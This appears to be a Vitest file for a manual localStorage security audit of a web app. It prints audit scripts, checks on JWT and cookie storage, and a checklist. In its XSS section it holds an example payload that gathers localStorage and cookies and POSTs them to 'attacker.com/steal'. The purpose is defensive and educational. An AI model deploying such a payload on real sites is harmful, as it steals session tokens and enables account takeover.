/**
 * localStorage Security Audit
 * 
 * Test ce verifică cum sunt stocate date sensibile în localStorage
 * Identifică potențiale vulnerabilități XSS și data exposure
 */

import { describe, it, expect } from 'vitest';

describe('🔒 localStorage Security Audit', () => {
  
  describe('1️⃣ Sensitive Data Storage', () => {
    it('should audit all localStorage keys', async () => {
      console.log('\n🧪 MANUAL TEST: localStorage Keys Audit');
      console.log('=======================================');
      
      const auditScript = `
// Paste this în browser console după login:

console.log('='.repeat(60));
console.log('LOCALSTORAGE SECURITY AUDIT');
console.log('='.repeat(60));

const sensitivePatterns = [
  'password', 'secret', 'token', 'key', 'auth',
  'session', 'credential', 'private', 'apikey'
];

let findings = [];

// Audit all localStorage keys
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
  
  console.log(\`\\nKey: \${key}\`);
  console.log(\`Value length: \${value?.length || 0} chars\`);
  
  // Check for sensitive patterns
  const hasSensitiveKey = sensitivePatterns.some(p => 
    key.toLowerCase().includes(p)
  );
  
  if (hasSensitiveKey) {
    findings.push({
      key,
      type: 'sensitive_key',
      risk: 'medium',
      value: value?.substring(0, 50) + '...'
    });
    console.log('⚠️  SENSITIVE KEY DETECTED');
  }
  
  // Check for passwords în value
  try {
    const parsed = JSON.parse(value);
    if (parsed && typeof parsed === 'object') {
      Object.keys(parsed).forEach(k => {
        if (sensitivePatterns.some(p => k.toLowerCase().includes(p))) {
          findings.push({
            key: \`\${key}.\${k}\`,
            type: 'sensitive_value',
            risk: k.toLowerCase().includes('password') ? 'critical' : 'high'
          });
          console.log(\`🔴 CRITICAL: Sensitive field "\${k}" in localStorage\`);
        }
      });
    }
  } catch (e) {
    // Not JSON, check raw value
    if (sensitivePatterns.some(p => value?.toLowerCase().includes(p))) {
      findings.push({
        key,
        type: 'sensitive_content',
        risk: 'medium'
      });
    }
  }
}

console.log('\\n' + '='.repeat(60));
console.log(\`FINDINGS: \${findings.length} issues\`);
console.log('='.repeat(60));

findings.forEach((f, i) => {
  console.log(\`\${i+1}. [\${f.risk.toUpperCase()}] \${f.key} - \${f.type}\`);
});

console.log('\\n' + '='.repeat(60));
      `;
      
      console.log(auditScript);
      
      console.log('\n✅ SAFE PRACTICES:');
      console.log('- Store only JWT tokens (not passwords)');
      console.log('- Tokens should be opaque (not decryptable client-side)');
      console.log('- No API keys în localStorage');
      console.log('- Use sessionStorage for temporary data');
      console.log('- Clear localStorage on logout\n');
      
      console.log('❌ UNSAFE:');
      console.log('- Storing passwords (plain or hashed)');
      console.log('- Storing API keys/secrets');
      console.log('- Storing PII without encryption');
      console.log('- Storing credit card data\n');
      
      expect(true).toBe(true);
    });

    it('should verify JWT token storage', async () => {
      console.log('\n🧪 MANUAL TEST: JWT Token Storage');
      console.log('==================================');
      
      console.log('Run în console:');
      console.log('const user = JSON.parse(localStorage.getItem("user"));');
      console.log('console.log("Token:", user?.token);\n');
      
      console.log('✅ Expected:');
      console.log('- Token format: xxx.yyy.zzz (3 parts separated by .)');
      console.log('- Each part is Base64 encoded');
      console.log('- Token does NOT contain password');
      console.log('- Token does NOT contain sensitive PII\n');
      
      console.log('Decode JWT payload (middle part):');
      console.log('const payload = JSON.parse(atob(user.token.split(".")[1]));');
      console.log('console.log("Payload:", payload);\n');
      
      console.log('✅ Payload should contain:');
      console.log('- id (user ID)');
      console.log('- username');
      console.log('- role');
      console.log('- companyId');
      console.log('- iat (issued at)');
      console.log('- exp (expiration)\n');
      
      console.log('❌ Payload should NOT contain:');
      console.log('- password');
      console.log('- email (optional - depends on app)');
      console.log('- personal data (SSN, etc.)');
      console.log('- payment info\n');
      
      expect(true).toBe(true);
    });
  });

  describe('2️⃣ XSS Access to localStorage', () => {
    it('should test XSS payload access to localStorage', async () => {
      console.log('\n🧪 MANUAL TEST: XSS localStorage Access');
      console.log('=======================================');
      
      console.log('Simulate XSS attack stealing localStorage:\n');
      
      const xssPayload = `
<script>
  // XSS Payload: Steal localStorage
  const stolenData = {
    localStorage: {},
    cookies: document.cookie,
    url: window.location.href
  };
  
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    stolenData.localStorage[key] = localStorage.getItem(key);
  }
  
  // Send to attacker server
  fetch('http://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(stolenData)
  });
</script>
      `;
      
      console.log('XSS Payload that steals localStorage:');
      console.log(xssPayload);
      
      console.log('\n⚠️  IMPACT:');
      console.log('If XSS exists, attacker can:');
      console.log('1. Read all localStorage data');
      console.log('2. Steal JWT tokens');
      console.log('3. Impersonate user');
      console.log('4. Access protected resources\n');
      
      console.log('🛡️  MITIGATIONS:');
      console.log('1. Prevent XSS (sanitize all inputs)');
      console.log('2. Use httpOnly cookies for sensitive tokens');
      console.log('3. Implement CSP headers');
      console.log('4. Short token expiry times');
      console.log('5. Token revocation on logout\n');
      
      expect(true).toBe(true);
    });

    it('should verify httpOnly cookie usage', async () => {
      console.log('\n🧪 MANUAL TEST: httpOnly Cookies');
      console.log('=================================');
      
      console.log('Check Application → Cookies în DevTools:\n');
      
      console.log('Session Cookie (geniuserp.sid):');
      console.log('✅ httpOnly: true (JavaScript cannot access)');
      console.log('✅ secure: true (HTTPS only în production)');
      console.log('✅ sameSite: lax\n');
      
      console.log('CSRF Token Cookie (csrf_token):');
      console.log('❌ httpOnly: false (needs to be readable by JS)');
      console.log('✅ secure: true (în production)');
      console.log('✅ sameSite: strict\n');
      
      console.log('Test în console:');
      console.log('document.cookie.includes("geniuserp.sid")');
      console.log('Expected: false (httpOnly blocks JS access)\n');
      
      expect(true).toBe(true);
    });
  });

  describe('3️⃣ Data Encryption', () => {
    it('should verify no plaintext sensitive data', async () => {
      console.log('\n🧪 MANUAL TEST: Plaintext Sensitive Data');
      console.log('=========================================');
      
      console.log('Search for plaintext sensitive data:\n');
      
      const searchScript = `
// Search all localStorage for plaintext patterns
const patterns = {
  email: /[a-z0-9._%+-]+@[a-z0-9.-]+\\.[a-z]{2,}/i,
  phone: /\\b\\d{10}\\b|\\b\\d{3}[-.]\\d{3}[-.]\\d{4}\\b/,
  ssn: /\\b\\d{3}-\\d{2}-\\d{4}\\b/,
  creditCard: /\\b\\d{4}[-\\s]?\\d{4}[-\\s]?\\d{4}[-\\s]?\\d{4}\\b/,
  password: /password["\\':\\s]+([^"\\',}]+)/i
};

Object.keys(localStorage).forEach(key => {
  const value = localStorage.getItem(key);
  
  Object.entries(patterns).forEach(([type, regex]) => {
    if (regex.test(value)) {
      console.warn(\`⚠️  Found \${type} în localStorage["\${key}"]\`);
    }
  });
});
      `;
      
      console.log(searchScript);
      
      console.log('\n❌ If found:');
      console.log('- Email: Consider hashing or not storing');
      console.log('- Phone: Should not be în localStorage');
      console.log('- SSN: NEVER store în localStorage');
      console.log('- Credit Card: NEVER store în localStorage');
      console.log('- Password: CRITICAL - remove immediately\n');
      
      expect(true).toBe(true);
    });
  });

  describe('4️⃣ Logout Cleanup', () => {
    it('should verify localStorage cleanup on logout', async () => {
      console.log('\n🧪 MANUAL TEST: Logout Cleanup');
      console.log('===============================');
      
      console.log('📝 STEPS:');
      console.log('1. Login to application');
      console.log('2. Note localStorage keys (F12 → Application → localStorage)');
      console.log('3. Logout');
      console.log('4. Check localStorage again\n');
      
      console.log('✅ Expected:');
      console.log('- user key removed');
      console.log('- auth_token removed');
      console.log('- All session data cleared');
      console.log('- Only app preferences remain (theme, language, etc.)\n');
      
      console.log('Check code în apps/web/src/hooks/use-auth.tsx:');
      console.log('logout function should call:');
      console.log('localStorage.removeItem("user")');
      console.log('localStorage.clear() // OR selective removal\n');
      
      expect(true).toBe(true);
    });
  });

  describe('5️⃣ Cross-Tab Data Leakage', () => {
    it('should test cross-tab data synchronization', async () => {
      console.log('\n🧪 MANUAL TEST: Cross-Tab Data Sync');
      console.log('====================================');
      
      console.log('📝 STEPS:');
      console.log('1. Open app în Tab 1, login');
      console.log('2. Open app în Tab 2 (same browser)');
      console.log('3. Check if Tab 2 has access to Tab 1 data\n');
      
      console.log('✅ This is EXPECTED (same origin):');
      console.log('- localStorage is shared across tabs');
      console.log('- Tab 2 can read Tab 1 localStorage');
      console.log('- This is by design, not a vulnerability\n');
      
      console.log('⚠️  Potential issue:');
      console.log('- Tab 1 logout should invalidate Tab 2 session');
      console.log('- Use storage event listener pentru cross-tab logout\n');
      
      const storageListenerCode = `
// apps/web/src/hooks/use-auth.tsx
window.addEventListener('storage', (e) => {
  if (e.key === 'user' && e.newValue === null) {
    // User logged out în other tab
    window.location.href = '/auth';
  }
});
      `;
      
      console.log('Implementation:');
      console.log(storageListenerCode);
      
      expect(true).toBe(true);
    });
  });

  describe('📊 localStorage Audit Summary', () => {
    it('should generate audit report', () => {
      console.log('\n' + '='.repeat(60));
      console.log('LOCALSTORAGE SECURITY CHECKLIST');
      console.log('='.repeat(60));
      
      const checklist = [
        '[ ] No passwords în localStorage',
        '[ ] No API keys/secrets în localStorage',
        '[ ] JWT tokens are opaque (not decryptable)',
        '[ ] JWT payload does not contain sensitive PII',
        '[ ] No credit card data în localStorage',
        '[ ] No SSN/personal identifiers în localStorage',
        '[ ] Email storage justified and documented',
        '[ ] Session cookie is httpOnly',
        '[ ] CSRF token cookie is NOT httpOnly (by design)',
        '[ ] localStorage cleared on logout',
        '[ ] Cross-tab logout synchronization works',
        '[ ] No plaintext sensitive patterns detected',
        '[ ] Token expiry implemented (15 min)',
        '[ ] CSP headers prevent malicious scripts'
      ];
      
      checklist.forEach(item => console.log(item));
      
      console.log('\n' + '='.repeat(60));
      console.log('RISK LEVELS:');
      console.log('🔴 CRITICAL: Passwords, API keys, credit cards în localStorage');
      console.log('🟠 HIGH: PII, SSN, unencrypted sensitive data');
      console.log('🟡 MEDIUM: Email, phone numbers without justification');
      console.log('🟢 LOW: JWT tokens with proper expiry');
      console.log('='.repeat(60) + '\n');
      
      console.log('BEST PRACTICES:');
      console.log('1. Use httpOnly cookies for session tokens (when possible)');
      console.log('2. Use localStorage only for JWT with short expiry');
      console.log('3. Implement token rotation/refresh');
      console.log('4. Clear all data on logout');
      console.log('5. Monitor for XSS vulnerabilities');
      console.log('6. Implement CSP to prevent script injection');
      console.log('='.repeat(60) + '\n');
      
      expect(true).toBe(true);
    });
  });
});

